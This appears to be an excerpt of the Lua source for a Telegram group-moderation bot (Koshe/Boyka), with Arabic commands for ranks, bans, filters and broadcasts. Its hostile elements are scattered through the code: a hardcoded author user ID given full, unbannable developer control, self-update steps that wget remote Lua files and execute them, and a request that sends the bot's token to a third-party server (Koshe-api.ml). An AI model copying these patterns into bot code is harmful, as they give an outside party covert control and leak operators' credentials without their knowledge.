...
SUDO = SUDO
sudo_users = {SUDO,1852838242,1852838242}   
print([[
┏┓━━━━━━━━━━━┏┓━━━━━━━━
┃┃━━━━━━━━━━━┃┃━━━━━━━━
┃┗━┓┏━━┓┏┓━┏┓┃┃┏┓┏━━┓         
...
io.popen("cd library && wget https://raw.githubusercontent.com/Koshe-DeV/Koshe/main/library/redis.lua") 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/QIQAQB/Files_Koshe/main/File_Bot/commands.lua") 
...
if hash or SudoBot(msg) or DevKosheW(msg) or Sudo(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevKosheW(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevKosheW(msg) or Sudo(msg) or SudoBotCoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevKosheW(msg) or Sudo(msg) or BasicConstructor(msg) or SudoBotCoSu(msg) or Bot(msg)  then   
return true
else
return false
end 
...
if hash or SudoBot(msg) or DevKosheW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or SudoBotCoSu(msg) or Bot(msg)  then   
return true
else
return false
end 
...
if hash or SudoBot(msg) or DevKosheW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or SudoBotCoSu(msg) or Bot(msg)  then   
return true
else
return false
end 
...
if hash or SudoBot(msg) or DevKosheW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or SudoBotCoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if tonumber(user_id) == tonumber(1852838242) then  
var = true  
elseif tonumber(user_id) == tonumber(1852838242) then
var = true  
...
local UserName = (data.username_ or "I_5_8")
...
local Koshe_Msg = ''  
if msgs < 100 then 
Koshe_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
Koshe_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
Koshe_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
Koshe_Msg = 'متفاعل' 
elseif msgs < 1200 then 
Koshe_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
Koshe_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
Koshe_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
Koshe_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
Koshe_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
Koshe_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
Koshe_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
Koshe_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
Koshe_Msg = 'رب التفاعل'  
end 
return Koshe_Msg 
end
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"@QIQAQB")  
...
--------------------------------------------------------------------------------------------------------------
function SourceKoshe(msg,data) -- بداية العمل كرار الخالدي
if msg then
...
local list = database:smembers(bot_id.."Koshe1:List:Filter"..sl)
...
if not DevKosheW(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
...
if DevKosheW(msg) and msg.reply_to_message_id_ ~= 0  then
...
send(msg.chat_id_, msg.id_,Koshe_Msg) 
return false  
end 
if text then
...
if text == 'تفعيل التواصل ✬' and DevKosheW(msg) then  
...
if text == 'تعطيل التواصل ✬' and DevKosheW(msg) then  
...
if text == 'تفعيل البوت الخدمي ✬' and DevKosheW(msg) then  
...
if text == 'تعطيل البوت الخدمي ✬' and DevKosheW(msg) then  
...
if text == 'ضع كليشه ستارت ✬' and DevKosheW(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' *✬︙ارسل لي الكليشه الان*')
return false
end
if text == 'حذف كليشه ستارت ✬' and DevKosheW(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' *✬︙تم حذف كليشه ستارت*')
end
if text == 'معلومات السيرفر ✬' and DevKosheW(msg) then 
...
if text == 'تحديث السورس ✬' and DevKosheW(msg) then 
os.execute('rm -rf Koshe.lua')
os.execute('wget https://raw.githubusercontent.com/Koshe-DeV/Koshe/main/Koshe.lua')
send(msg.chat_id_, msg.id_,' *✬︙تم تحديث السورس* \n*✬︙لديك اخر اصدار لسورس بويكا*\n*✬︙الاصدار » { 2.8v}*')
dofile('Koshe.lua')  
end
if text == 'الاصدار ✬' and DevKosheW(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' *✬︙اصدار سورس بويكا* \n*✬︙الاصدار »{ 2.8v}*')
end
if text == 'قناه تحديثات البوت ✬' and DevKosheW(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ✬︙[تحديثات البوت](t.me/QIQAQB) \n✬︙[قناه السورس](t.me/I_5_8)')
end
if text == "ضع اسم للبوت ✬" and DevKosheW(msg) then  
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," *✬︙ارسل اليه الاسم الان* ")
return false
end
if text == 'الاحصائيات ✬' and DevKosheW(msg) then 
...
if text == 'المشتركين ✬' and DevKosheW(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n *✬︙المشتركين» {`'..Users..'`}*'
send(msg.chat_id_, msg.id_,Text) 
...
if text == 'الكروبات ✬' and DevKosheW(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n *✬︙الكروبات» {`'..Groups..'`}*'
send(msg.chat_id_, msg.id_,Text) 
...
if text == ("المطورين ✬") and DevKosheW(msg) then
...
if text == ("قائمه العام ✬") and DevKosheW(msg) then
...
if text == ("قائمه الكتم العام ✬") and DevKosheW(msg) then
...
if text=="اذاعه خاص ✬" and msg.reply_to_message_id_ == 0 and DevKosheW(msg) then 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," *✬︙ارسل الان اذاعتك؟* \n*✬︙للخروج ارسل الغاء* ")
return false
end 
if text=="اذاعه ✬" and msg.reply_to_message_id_ == 0 and DevKosheW(msg) then 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," *✬︙ارسل الان اذاعتك؟* \n*✬︙للخروج ارسل الغاء* ")
return false
end  
if text=="اذاعه بالتثبيت ✬" and msg.reply_to_message_id_ == 0 and DevKosheW(msg) then 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," *✬︙ارسل الان اذاعتك؟* \n*✬︙للخروج ارسل الغاء* ")
return false
end 
if text=="اذاعه بالتوجيه ✬" and msg.reply_to_message_id_ == 0  and DevKosheW(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," *✬︙ارسل لي التوجيه الان*")
return false
end 
if text=="اذاعه بالتوجيه خاص ✬" and msg.reply_to_message_id_ == 0  and DevKosheW(msg) then 
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ✬︙ارسل لي التوجيه الان")
return false
end 
if text == 'جلب نسخه الاحتياطيه ✬' and DevKosheW(msg) then 
GetFile_Bot(msg)
end
if text == "تنظيف المشتركين ✬" and DevKosheW(msg) then
...
if text == "تنظيف الكروبات ✬" and DevKosheW(msg) then 
...
send(msg.chat_id_, msg.id_,'*✬︙عدد الكروبات الان » { '..#group..' }'..Koshek..''..Koshe..'*\n*✬︙الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات*\n')   
end
end
end,nil)
end
...
if text and text:match("^رفع مطور @(.*)$") and DevKosheW(msg) then
...
usertext = '*\n ✬︙اسم المستخدم »* ['..result.title_..'](t.me/'..(username or 'I_5_8')..')'
status  = '\n *✬︙تم ترقيته مطور*'
...
if text and text:match("^رفع مطور (%d+)$") and DevKosheW(msg) then
local userid = text:match("^رفع مطور (%d+)$")
database:sadd(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *✬︙اسم المستخدم »* ['..data.first_name_..'](t.me/'..(data.username_ or 'I_5_8')..')'
status  = '\n*✬︙تم ترقيته مطور*'
...
if text and text:match("^تنزيل مطور @(.*)$") and DevKosheW(msg) then
...
if text and text:match("^تنزيل مطور (%d+)$") and DevKosheW(msg) then
...
local Koshe1_Msg = database:get(bot_id.."Koshe1:Add:Filter:Rp2"..text..msg.chat_id_)   
if Koshe1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *✬︙اسم المستخدم »* ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'I_5_8')..') \n ✬︙'..Koshe1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if Koshe_Msg and not Special(msg) then  
local Koshe_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if Koshe_Msg then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," *✬︙العضو :* {["..data.first_name_.."](T.ME/"..data.username_..")}\n✬︙["..Koshe_Msg.."] \n")
else
send(msg.chat_id_,0," *✬︙العضو :* {["..data.first_name_.."](T.ME/I_5_8)}\n✬︙["..Koshe_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
...
send(msg.chat_id_,0, " *✬︙عذرا ↫* {["..data.first_name_.."](T.ME/I_5_8)}\n*✬︙عذرا تم منع الملصق* \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevKosheW(msg) then
...
if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevKosheW(msg) then
...
if text and text:match("^تغير الاشتراك$") and DevKosheW(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' *✬︙حسنآ ارسل لي معرف القناة*')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and DevKosheW(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' *✬︙حسنآ ارسل لي النص الذي تريده*')
return false  
end
if text == "حذف رساله الاشتراك ✬" and DevKosheW(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, " *✬︙تم مسح رساله الاشتراك* ")
return false  
end
if text and text:match("^وضع قناة الاشتراك ✬$") and DevKosheW(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' *✬︙حسنآ ارسل لي معرف القناة*')
return false  
end
if text == "تفعيل الاشتراك الاجباري ✬" and DevKosheW(msg) then  
...
if text == "تعطيل الاشتراك الاجباري ✬" and DevKosheW(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " *✬︙تم تعطيل الاشتراك الاجباري* ")
return false  
end
if text == "الاشتراك الاجباري ✬" and DevKosheW(msg) then  
if database:get(bot_id..'add:ch:username') then
local addchusername = database:get(bot_id..'add:ch:username')
...
database:sadd(bot_id.."Koshe:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."Koshe:blocname"..msg.chat_id_)
...
if t2.id_ then 
name_Koshe = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_Koshe then 
names_Koshe = database:smembers(bot_id.."Koshe:blocname"..msg.chat_id_) or ""
if names_Koshe and names_Koshe[1] then 
for i=1,#names_Koshe do 
if name_Koshe:match("(.*)("..names_Koshe[i]..")(.*)") then 
...
database:set(bot_id.."Koshe:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."Koshe:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."Koshe:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."Koshe:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."Koshe:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function amir_Koshea_new(Koshe1,Koshe2)
if Koshe2 and Koshe2.first_name_ then 
if Koshe2.first_name_:match("(.*)"..database:get(bot_id.."Koshe:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."Koshe:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local Koshe_nnn = database:get(bot_id.."Koshe:nump"..msg.chat_id_) or 5
local Koshe_nnn2 = database:get(bot_id.."Koshe:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(Koshe_nnn2) == tonumber(Koshe_nnn) or tonumber(Koshe_nnn2) > tonumber(Koshe_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."Koshe:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "✬︙عزيزي >>["..Koshe2.username_.."](https://t.me/"..(Koshe2.username_ or "I_5_8")..")\n✬︙عليك وضع التوحيد ⪼ {"..database:get(bot_id.."Koshe:teh"..msg.chat_id_).."} بجانب اسمك\n✬︙عدد المحاولات المتبقيه {"..(tonumber(Koshe_nnn) - tonumber(Koshe_nnn2)).."}")
end
end
end
end
bnnaGet(id, amir_Koshea_new)
end
end
...
local KosheChengName = database:get(bot_id.."Koshe:Cheng:Name"..data.id_)
if not data.first_name_ then 
if KosheChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..KosheChengName..']')
database:del(bot_id.."Koshe:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if KosheChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."Koshe:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local KosheChengUserName = database:get(bot_id.."Koshe:Cheng:UserName"..data.id_)
if not data.username_ then 
if KosheChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..KosheChengUserName..']')
database:del(bot_id.."Koshe:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if KosheChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."Koshe:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local KosheChengPhoto = database:get(bot_id.."Koshe:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if KosheChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."Koshe:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if KosheChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."Koshe:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)   
...
local url,res = https.request('https://Koshe-api.ml/ChatMember.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.info ~= true then
send(msg.chat_id_,msg.id_,'✫: شترك في قناة السورس اولآ @QIQAQB .')   
return false 
end
Text = "ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ sᴏᴜʀᴄʀ ʙᴏʏᴋᴀ\n\n[-  ʙᴏʏᴋᴀ ᴄʜᴀɴɴᴇʟ  .](http://t.me/QIQAQB)\n\n[-  ɪɴғᴏ sᴏᴜʀᴄᴇ .](http://t.me/I_5_8)\n\n[-  ʙᴏʏᴋᴀ ᴅᴇᴠᴇʟᴏᴘᴇʀ  .](http://t.me/QIQAQB)\n\n[-  ʙᴏᴛ ʙᴏʏᴋᴀ .](http://t.me/rriebot)"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✫: ʙᴏʏᴋᴀ sᴏᴜʀᴄʀ .',url="t.me/QIQAQB/567"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/QIQAQB&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
if text == 'رفع نسخه الاحتياطيه' and DevKosheW(msg) then  
if tonumber(msg.reply_to_message_id_) > 0 then
...
local msg_id = msg.id_/2097152/0.5
local done = json:decode(https.request("https://Koshe-api.ml/Do/searchinbot.php?token="..token.."&chat_id="..msg.chat_id_.."&from="..msg.sender_user_id_.."&msg="..msg_id.."&Text="..TextSearch.."&n=s")) 
end
end
...
send(msg.chat_id_, msg.id_, '*✬︙بواسطه* » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'I_5_8')..') \n*✬︙تم تفعيل التنظيف التلقائي* ')
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *✬︙بواسطه »* ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'I_5_8')..') \n*✬︙تـم قفـل التاك بالكتم* ')
end,nil)   
...
------------------------------------------------------------------------ امـيـر الـدلـيـم
if text == 'تحديث' and DevKosheW(msg) then
dofile('Koshe.lua')  
send(msg.chat_id_, msg.id_, ' *✬︙تم تحديث جميع الملفات*') 
end 
if text == ("مسح قائمه العام") and DevKosheW(msg) then
...
if text == ("حظر عام") and msg.reply_to_message_id_ and DevKosheW(msg) then  
function start_function(extra, result, success)
if KosheSudoBot(result.sender_user_id_) then
...
if text and text:match("^حظر عام @(.*)$")  and DevKosheW(msg) then  
...
if KosheSudoBot(result.id_) then
send(msg.chat_id_, msg.id_,"*✬︙لا تستطيع (كتم،طرد،حظر،تققيد) مطور السورس او الاساسي*")
return false 
end
...
if text and text:match("^حظر عام (%d+)$") and DevKosheW(msg) then  
local userid = text:match("^حظر عام (%d+)$")
if KosheSudoBot(userid) then
send(msg.chat_id_, msg.id_,"*✬︙لا تستطيع (كتم،طرد،حظر،تققيد) مطور السورس او الاساسي*")
return false 
end
...
if text == ("كتم عام") and msg.reply_to_message_id_ and DevKosheW(msg) then  
function start_function(extra, result, success)
if KosheSudoBot(result.sender_user_id_) then
send(msg.chat_id_, msg.id_,"*✬︙لا تستطيع (كتم،طرد،حظر،تققيد) مطور السورس او الاساسي*")
return false 
...
if text and text:match("^كتم عام @(.*)$")  and DevKosheW(msg) then  
...
if text and text:match("^كتم عام (%d+)$") and DevKosheW(msg) then  
local userid = text:match("^كتم عام (%d+)$")
if KosheSudoBot(bot_id) then
send(msg.chat_id_, msg.id_,"*✬︙لا تستطيع (كتم،طرد،حظر،تققيد) مطور السورس او الاساسي*")
return false 
end
if tonumber(userid) == tonumber(bot_id) then  
...
if text == ("الغاء العام") and msg.reply_to_message_id_ and DevKosheW(msg) then  
function start_function(extra, result, success)
...
if text and text:match("^الغاء العام @(.*)$") and DevKosheW(msg) then  
...
if text and text:match("^الغاء العام (%d+)$") and DevKosheW(msg) then  
...
------------------------------------------------------------------------ امـيـر الـدلـيـم
if text == ("مسح المطورين") and DevKosheW(msg) then
...
if text == 'الملفات' and DevKosheW(msg) then
...
if DevKosheW(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Koshe-DeV/Files_Koshe/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n *✬︙اهلا بك في متجر ملفات بويكا*\n*✬︙ملفات السورس ↓*\n*•━━━━━━ ʙᴏʏ ━━━━━━━•*\n\n"
local TextE = "\n*•━━━━━━ ʙᴏʏ ━━━━━━━•*\n *✬︙علامة تعني { ✓ } ملف مفعل*\n *✬︙علامة تعني { ✘ } ملف معطل*\n *✬︙قناة سورس بويكا ↓*\n".." *✬︙*[اضغط هنا لدخول](t.me/I_5_8) \n"
local NumFile = 0
...
if text and text:match("^(تعطيل) (.*)(.lua)$") and DevKosheW(msg) then
...
local json_file, res = https.request("https://raw.githubusercontent.com/Koshe-DeV/Files_Koshe/main/File_Bot/"..file)
if res == 200 then
...
if text and text:match("^(تفعيل) (.*)(.lua)$") and DevKosheW(msg) then
...
if text == "مسح الملفات" and DevKosheW(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," *✬︙تم مسح الملفات*")
return false
end

if text == ("رفع مطور") and msg.reply_to_message_id_ and DevKosheW(msg) then  
function start_function(extra, result, success)
...
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevKosheW(msg) then  
function start_function(extra, result, success)
...
local UserName = (b.username_ or "I_5_8")
...
function Function_Koshe(extra, result, success)
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Koshe, nil)
return false 
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Koshe, nil)
return false 
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *✬︙العضو* » ['..data.first_name_..'](t.me/'..(data.username_ or 'I_5_8')..')'
status  = '\n*✬︙تم ترقيته ادمن*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *✬︙لعضو »* ['..data.first_name_..'](t.me/'..(data.username_ or 'I_5_8')..')'
status  = '\n*✬︙تم تنزيله من المميزين*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *✬︙اسم المستخدم »* '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *✬︙العضــو »* ['..data.first_name_..'](t.me/'..(data.username_ or 'I_5_8')..')'
...
database:set(bot_id.."Koshe1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."Koshe1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," *✬︙ارسل التحذير عند ارسال الكلمه*")  
database:set(bot_id.."Koshe1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."Koshe1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."Koshe1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."Koshe1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," *✬︙تم منع الكلمه مع التحذير*")  
database:del(bot_id.."Koshe1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."Koshe1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."Koshe1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."Koshe1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," *✬︙ارسل الكلمه الان*")  
database:set(bot_id.."Koshe1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."Koshe1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."Koshe1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Koshe1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."Koshe1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."Koshe1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."Koshe1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Koshe1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."Koshe1:List:Filter"..msg.chat_id_,v)  
end  
...
if text == 'مسح كليشه المطور' and DevKosheW(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,' *✬︙تم مسح كليشه المطور*')
end
if text == 'ضع كليشه المطور' and DevKosheW(msg) then
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n *✬︙اسم المستخدم »* ['..result.title_..'](t.me/'..(text1[3] or 'I_5_8')..')'..'\n*✬︙تم رفعه '..text1[2]..'*')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == 'تفعيل الاذاعه' and DevKosheW(msg) then  
...
if text == 'تعطيل الاذاعه' and DevKosheW(msg) then  
...
send(msg.chat_id_, msg.id_,'['..Koshe_Msg[math.random(#Koshe_Msg)]..']') 
return false
end
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevKosheW(msg) then 
...
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 200},function(ta,Koshe)
local t = "\n*ツ قائمة الاعضاء* \n*•━━━━━━ ʙᴏʏ ━━━━━━━•*\n"
x = 0
local list = Koshe.members_
for k, v in pairs(list) do
x = x + 1
...
if KosheSudoBot(msg.sender_user_id_) then
database:srem(bot_id..'DEV:Sudo:T', result.sender_user_id_)
database:srem(bot_id..'Sudo:User', result.sender_user_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
...
if text == ("مسح ردود المطور") and DevKosheW(msg) then 
...
if text == ("ردود المطور") and DevKosheW(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n ✬︙قائمة ردود المطور \n*•━━━━━━ ʙᴏʏ ━━━━━━━•*\n"
for k,v in pairs(list) do
...
if text == 'اضف رد للكل' and DevKosheW(msg) then    
send(msg.chat_id_, msg.id_,' *✬︙ارسل الكلمه تريد اضافتها*')
database:set(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_,true)
return false 
end
if text == 'حذف رد للكل' and DevKosheW(msg) then    
...
if text == 'تفعيل المغادره' and DevKosheW(msg) then   
...
if text == 'تعطيل المغادره' and DevKosheW(msg) then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n*✬︙العضو »* ['..data.first_name_..'](t.me/'..(data.username_ or 'QIQAQB')..') '
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'I_5_8')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
Koshedx(msg.chat_id_, msg.id_, ' *✬︙ايدي المجموعة » ( '..msg.chat_id_..' )*\n*✬︙عدد الادمنيه » ( '..data.administrator_count_..' )*\n*✬︙عدد المحظورين » ( '..data.kicked_count_..' )*\n*✬︙عدد الاعضاء » ( '..data.member_count_..' )*\n', 'md') 
end 
...
if text == 'استعاده الاوامر' and DevKosheW(msg) then
...
{{text = '- sᴏᴜʀᴄʀ ʙᴏʏᴋᴀ', url="t.me/QIQAQB"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
{{text = '- sᴏᴜʀᴄʀ ʙᴏʏᴋᴀ', url="t.me/QIQAQB"}},
{{text = 'مطور السورس', url="t.me/QIQAQB"}},
}
...
zh = https.request('https://Koshe-api.ml/frills.php?en='..URL.escape(TextZhrfa)..'')
zx = JSON.decode(zh)
t = "\n*✬︙قائمه الزخرفه* \nٴ✬∫ٴ*•━━━━━━ ʙᴏʏ ━━━━━━━•*ٴ✬∫○ٴ \n"
i = 0
...
gk = https.request('https://Koshe-api.ml/Horoscopes.php?br='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
i = 0
...
ge = https.request('https://Koshe-api.ml/Calculateage.php?age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
i = 0
...
data,res = https.request('https://Koshe-api.ml/audios.php')
if res == 200 then
...
{{text = '~ Koshe •',url='http://t.me/QIQAQB'}},
}
...
